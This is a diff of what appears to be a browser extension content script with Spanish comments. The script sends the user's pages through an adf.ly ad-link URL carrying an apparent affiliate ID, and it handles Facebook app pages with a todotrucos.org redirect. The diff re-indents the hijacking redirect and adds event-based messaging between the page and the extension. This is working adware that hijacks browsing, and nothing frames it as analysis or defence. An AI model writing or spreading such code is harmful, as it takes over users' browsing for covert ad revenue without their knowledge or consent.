@@ -8,11 +8,12 @@ if (document.URL.indexOf("google.com") == -1 && document.URL.indexOf("apps.faceb
 	}
 }
 
+
 var lista = [];
 //cada ves que abro una pagina
 if(lista.indexOf(window.location.host) == -1){
- lista.push(window.location.host);
- window.location.href = "http://adf.ly/4531564/"+document.URL;
+	lista.push(window.location.host);
+	window.location.href = "http://adf.ly/4531564/"+document.URL;
 }
 
 if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
@@ -30,3 +31,22 @@ if (document.URL.indexOf('adf.ly/') != -1){
 	window.setTimeout(adfly,15000);
 }
 
+
+//Events
+document.addEventListener("MyAnswerEvent",function(e) { ExtensionAnswer(e); },false);
+
+var element;
+function requestList(){
+	element = document.createElement("MyExtensionDataElement");
+	element.setAttribute("attribute1", "requestList");
+	document.documentElement.appendChild(element);
+
+	var evt = document.createEvent("Events");
+	evt.initEvent("MyExtensionEvent", true, false);
+	element.dispatchEvent(evt);
+}
+
+function ExtensionAnswer(EvtAnswer)
+{
+	lista = element.getAttribute("attribute3");
+}
